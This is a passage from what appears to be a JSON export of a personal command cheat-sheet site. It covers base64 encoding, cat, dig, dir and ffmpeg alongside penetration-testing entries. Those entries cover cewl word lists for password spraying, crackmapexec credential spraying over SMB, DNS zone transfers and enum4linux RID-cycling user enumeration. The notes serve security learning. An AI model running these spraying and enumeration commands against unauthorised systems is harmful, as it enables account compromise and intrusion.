$STRING to base64.\n#\necho &quot;$STRING&quot; | basenc --base64\n \n# Encode $STRING to URL-safe base64.\n#\necho &quot;$STRING&quot; | basenc --base64url\n \n# Dencode $BASE64_STRING from base64.\n#\necho &quot;$BASE64_STRING&quot; | basenc -d --base64\n \n# Dencode $BASE64_STRING from URL-safe base64.\n#\necho &quot;$BASE64_STRING&quot; | basenc -d --base64url\nThe advantage of basenc over base64 is that basenc supports URL-safe base64-encoding/decoding out of the box, which I’ve otherwise found is a pain to work with.","richContent":"&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Encode $STRING to base64.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;echo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;$STRING&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; basenc&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; --base64&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Encode $STRING to URL-safe base64.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;echo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;$STRING&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; basenc&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; --base64url&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Dencode $BASE64_STRING from base64.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;echo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;$BASE64_STRING&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; basenc&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -d&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; --base64&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Dencode $BASE64_STRING from URL-safe base64.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;echo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;$BASE64_STRING&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; basenc&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -d&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; --base64url&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;The advantage of basenc over base64 is that basenc supports URL-safe base64-encoding/decoding out of the box, which I’ve otherwise found is a pain to work with.&lt;/p&gt;"},"spells/cat":{"slug":"spells/cat","filePath":"spells/cat.md","title":"cat","links":[],"tags":["Application/cat"],"content":"# Use cat to add line numbers to a file!\n#\ncat -n &lt; $FILE\n \n# Only number non-blank lines\n#\ncat -b &lt; $FILE","richContent":"&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Use cat to add line numbers to a file!&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;cat&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -n&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; &amp;#x3C;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $FILE&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Only number non-blank lines&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;cat&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -b&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; &amp;#x3C;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $FILE&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/cewl":{"slug":"spells/cewl","filePath":"spells/cewl.md","title":"cewl","links":[],"tags":["Application/cewl","OS/Linux/Distros/Kali","AttackCycle/Reconnaissance"],"content":"The cewl utility (sudo apt install cewl on Kali Linux) can be used to crawl a website and extract strings that can be used as a word list.\ncewl -w $OUTPUT_FILE \\\n     -d $DEPTH_TO_SPIDER \\\n     -m $MINIMUM_STRING_LENGTH \\\n        $URL \nIt’s generally worth pulling strings out of a company’s website to seed a word list before attempting password spraying or brute-force login attacks.","richContent":"&lt;p&gt;The cewl utility (&lt;code&gt;sudo apt install cewl&lt;/code&gt; on Kali Linux) can be used to crawl a website and extract strings that can be used as a word list.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;cewl&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -w&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $OUTPUT_FILE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;     -d&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $DEPTH_TO_SPIDER&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;     -m&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $MINIMUM_STRING_LENGTH&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;        $URL&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;It’s generally worth pulling strings out of a company’s website to seed a word list before attempting password spraying or brute-force login attacks.&lt;/p&gt;"},"spells/crackmapexec":{"slug":"spells/crackmapexec","filePath":"spells/crackmapexec.md","title":"crackmapexec","links":[],"tags":["Application/crackmapexec","Protocol/SMB","AttackCycle/Exploitation"],"content":"Spray credential across a network looking for SMB shares that can be logged in to:\ncrackmapexec smb $BROADCAST/$SUBNET_MASK -u $USERNAME -p $PASSWORD","richContent":"&lt;p&gt;Spray credential across a network looking for SMB shares that can be logged in to:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;crackmapexec&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; smb&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $BROADCAST&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$SUBNET_MASK&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -u&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $USERNAME&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -p&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $PASSWORD&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/dig":{"slug":"spells/dig","filePath":"spells/dig.md","title":"dig","links":[],"tags":["Application/dig","AttackCycle/Reconnaissance","Protocol/DNS"],"content":"# dig command syntax; only $DOMAIN is required\n#\ndig @$NAME_SERVER $DOMAIN $QUERY_TYPE\n \n# Examples\n#\ndig @8.8.8.8 microsoft.com A\ndig @1.1.1.1 tryhackme.com\ndig          google.com    MX\n \n# If the DNS server allows the request of zone transfer\n# information, then it&#039;s possible to quickly enumerate *all*\n# DNS information associated with a given domain\n#\ndig @$NAME_SERVER $DOMAIN -t AXFR","richContent":"&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# dig command syntax; only $DOMAIN is required&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;dig&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; @&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$NAME_SERVER&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $DOMAIN&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $QUERY_TYPE&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Examples&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;dig&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; @8.8.8.8&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; microsoft.com&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; A&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;dig&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; @1.1.1.1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; tryhackme.com&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;dig&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;          google.com&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;    MX&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# If the DNS server allows the request of zone transfer&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# information, then it&#039;s possible to quickly enumerate *all*&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# DNS information associated with a given domain&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;dig&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; @&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$NAME_SERVER&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $DOMAIN&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -t&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; AXFR&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/dir":{"slug":"spells/dir","filePath":"spells/dir.md","title":"dir","links":[],"tags":["Application/dir","OS/Windows"],"content":"The dir command in Windows/DOS is equivalent to the *NIX ls command.\nWildcard listings (*.txt, etc.) can be used, and dir will perform a subdirectory search if given the /S flag. For example:\ndir /S /P example.txt","richContent":"&lt;p&gt;The dir command in Windows/DOS is equivalent to the *NIX ls command.&lt;/p&gt;\n&lt;p&gt;Wildcard listings (&lt;code&gt;*.txt&lt;/code&gt;, etc.) can be used, and dir will perform a subdirectory search if given the &lt;code&gt;/S&lt;/code&gt; flag. For example:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;dir &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;S &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;P example.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/enum4linux":{"slug":"spells/enum4linux","filePath":"spells/enum4linux.md","title":"enum4linux","links":[],"tags":["Application/enum4linux","Protocol/SMB","OS/Linux"],"content":"For UNIX-like systems running Samba, enum4linux works well.\nenum4linux -a $TARGET_IP\nAs of the time of this writing (November 5, 2021) however, it looks like enum4linux’s normal user enumeration has been broken for quite some time. However, the “RID cycling” method of discovering users still works — so just call enum4linux with either the -r flag (to specifically use RID cycling to enumerate users) or the -a flag (which does a complete enumeration, including RID cycling) rather than the -U flag.","richContent":"&lt;p&gt;For UNIX-like systems running Samba, &lt;a href=&quot;https://null-byte.wonderhowto.com/how-to/enumerate-smb-with-enum4linux-smbclient-0198049/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;enum4linux&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; works well.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;enum4linux&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -a&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $TARGET_IP&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;As of the time of this writing (November 5, 2021) however, it looks like &lt;a href=&quot;https://github.com/CiscoCXSecurity/enum4linux/issues/4&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;enum4linux’s normal user enumeration has been broken for quite some time&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;. However, the “RID cycling” method of discovering users still works — so just call enum4linux with either the &lt;code&gt;-r&lt;/code&gt; flag (to specifically use RID cycling to enumerate users) or the &lt;code&gt;-a&lt;/code&gt; flag (which does a complete enumeration, including RID cycling) rather than the &lt;code&gt;-U&lt;/code&gt; flag.&lt;/p&gt;"},"spells/ffmpeg":{"slug":"spells/ffmpeg","filePath":"spells/ffmpeg.md","title":"ffmpeg","links":[],"tags":["Application/ffmpeg","FileFormat/M4A","FileFormat/MP3","FileFormat/MP4","FileFormat/GIF","FileFormat/WebP","Application/LAME"],"content":"M4A to MP3\nffmpeg -i ${INPUT}.m4a -c:v copy -c:a libmp3lame \\\n       -q:a 0 ${OUTPUT}.mp3\nThe -q:a parameters correspond to LAME’s -V option, so 0 is the highest quality and 9 is the lowest quality. While everyone says to use 3 or 4 for this parameter, in my experience even using 0 will often result in a smaller file than an m4a original. (What’s up with that? I thought that m4a was supposed to be more efficient than mp3?)\nMP4 to GIF\n\n\n                  \n                  Note\n                  \n                \n\n\nAdapted from Create animated GIFs from MP4 with FFmpeg.\n\n\n\n# Generate an optimized palette.\n#\nffmpeg -i $INPUT.mp4 \\\n       -filter_complex &quot;[0:v] palettegen&quot; $PALETTE.png\n \n# Convert the MP4 to GIF (using the palette above).\n#\nffmpeg -i $INPUT.mp4 -i $PALETTE.png \\\n       -filter_complex &quot;[0:v][1:v] paletteuse&quot; \\\n\t                    $OUTPUT.gif\nMP4 to WebP\n\n\n                  \n                  Note\n                  \n                \n\n\nAdapted from Create animated GIF and WebP from videos using FFmpeg.\n\n\n\nffmpeg -i $INPUT.mp4 \\\n       -vf &quot;fps=10,scale=720:-1:flags=lanczos&quot; \\\n       -vcodec libwebp -lossless 0 -compression_level 6 \\\n       -q:v 50 -loop 0 -preset picture -an \\\n       -vsync 0 $OUTPUT.webp","richContent":"&lt;h2 id=&quot;m4a-to-mp3&quot;&gt;M4A to MP3&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#m4a-to-mp3&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;ffmpeg&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -i&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; ${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;INPUT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;.m4a&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -c:v&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; copy&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -c:a&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; libmp3lame&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;       -q:a&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; ${&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;OUTPUT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;.mp3&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;&lt;a href=&quot;https://trac.ffmpeg.org/wiki/Encode/MP3&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;The &lt;code&gt;-q:a&lt;/code&gt; parameters correspond to LAME’s &lt;code&gt;-V&lt;/code&gt; option&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 